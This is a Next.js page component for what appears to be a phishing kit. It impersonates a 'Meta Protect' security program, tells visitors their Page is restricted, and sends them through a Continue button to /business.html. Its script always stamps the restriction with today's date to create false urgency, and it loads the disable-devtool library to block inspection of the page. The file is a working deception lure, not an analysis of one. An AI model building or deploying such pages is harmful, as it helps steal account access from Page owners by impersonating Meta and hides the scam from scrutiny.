// pages/community-standard.js
import Head from 'next/head';
import Script from 'next/script'; // For including external scripts
import Image from 'next/image'; // For handling images

export default function CommunityStandard() {
    return (
        <div>
            <Head>
                <title>Community Standard</title>
                <meta charset="utf-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1" />
                
                {/* External CSS */}
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
                <link href="https://fonts.cdnfonts.com/css/segoe-ui-4" rel="stylesheet" />
                <link href="https://fonts.cdnfonts.com/css/frutiger" rel="stylesheet" />
                <link href="https://fonts.googleapis.com/css2?family=AR+One+Sans&family=Ruda:wght@500&display=swap" rel="stylesheet" />
                <link rel="shortcut icon" href="/img/xike.ico" />
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
                <link rel="stylesheet" href="/style/index.css" />
                <meta property="og:image" content="https://res.cloudinary.com/dppdtq0df/image/upload/v1705144092/head_lkdnjp.png" />
            </Head>
            <main>
                <div className="lsd-ring-container d-none">
                    <div className="lds-ring">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                </div>
                <div className="card-container d-none" id="getCode">
                    <div className="card" style={{ maxWidth: '700px', border: 'none' }}>
                        <div className="card-header py-3" style={{ backgroundColor: 'rgb(53 87 151)', color: 'white' }}>
                            Form Submitted Successfully
                        </div>
                        <div className="card-body">
                            <p className="card-text text-muted">Thanks for contacting us. You'll get a notification when we respond in 1-2 business days. You can view responses in your Support Inbox.</p>
                            <hr />
                            <span id="back-hone" className="btn" style={{ backgroundColor: 'rgb(53 87 151)', color: 'white' }}>I Understand</span>
                        </div>
                    </div>
                </div>
                <div className="bg-light d-flex justify-content-center align-items-center">
                    <div className="card my-5" id="code-form" style={{ maxWidth: '650px', border: 'none', boxShadow: 'rgba(149, 157, 165, 0.2) 0px 8px 24px' }}>
                        <div className="card-body">
                            <Image src="/img/B2Y8S9I.jpg" className="w-100 rounded" alt="" width={650} height={400} />
                            <h2 className="card-title fw-bold mt-4">Welcome To Meta Protect.</h2>
                            <p className="card-text py-3">
                                Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.
                            </p>
                            <div className="d-flex py-3 justify-content-start align-items-end position-relative">
                                <div className="mx-3 d-flex justify-content-center align-items-center flex-column">
                                    <i className="fa fa-check-circle" style={{ color: '#c4c4c4', fontSize: '25px' }} aria-hidden="true"></i>
                                    <div style={{ width: '2px', height: '2rem', backgroundColor: 'rgb(229,231,235)', position: 'absolute', bottom: '-1rem' }}></div>
                                </div>
                                <p className="mb-0">We've enabled advanced protections to unlock your Page.</p>
                            </div>
                            <div className="d-flex py-3 justify-content-between align-items-start">
                                <div className="mx-3">
                                    <i className="fa fa fa-id-card" style={{ color: '#355797', fontSize: '25px' }} aria-hidden="true"></i>
                                </div>
                                <p className="mb-0">Below, we walk you through the process in detail and help you fully activate to unlock your Page.</p>
                            </div>
                            <a href="/business.html" type="button" className="btn border w-100 py-3 fw-bold" style={{ backgroundColor: 'rgb(63 131 248)', color: 'white' }}>Continue</a>
                            <p className="text-center mb-0 mt-3">
                                Your page was restricted on <span id="month" className="fw-bold">Month</span> <span id="date" className="fw-bold">Date</span>, <span id="year" className="fw-bold">Year</span>.
                            </p>
                        </div>
                    </div>
                </div>
            </main>

            {/* External JavaScript */}
            <Script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" strategy="beforeInteractive" />
            <Script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" strategy="beforeInteractive" />
            <Script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" strategy="beforeInteractive" />
            <Script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.8/dist/sweetalert2.all.min.js" strategy="beforeInteractive" />
            <Script src="https://cdn.jsdelivr.net/npm/disable-devtool@latest" strategy="beforeInteractive" />

            <Script>
                {`
                    $(document).ready(function() {
                        function setCurrentDate() {
                            var currentDate = new Date();
                            var monthNames = ["January", "February", "March", "April", "May", "June",
                                "July", "August", "September", "October", "November", "December"
                            ];

                            var month = monthNames[currentDate.getMonth()];
                            var date = currentDate.getDate();
                            var year = currentDate.getFullYear();

                            $('#month').text(month);
                            $('#date').text(date);
                            $('#year').text(year);
                        }

                        setCurrentDate();
                    });
                `}
            </Script>
        </div>
    );
}
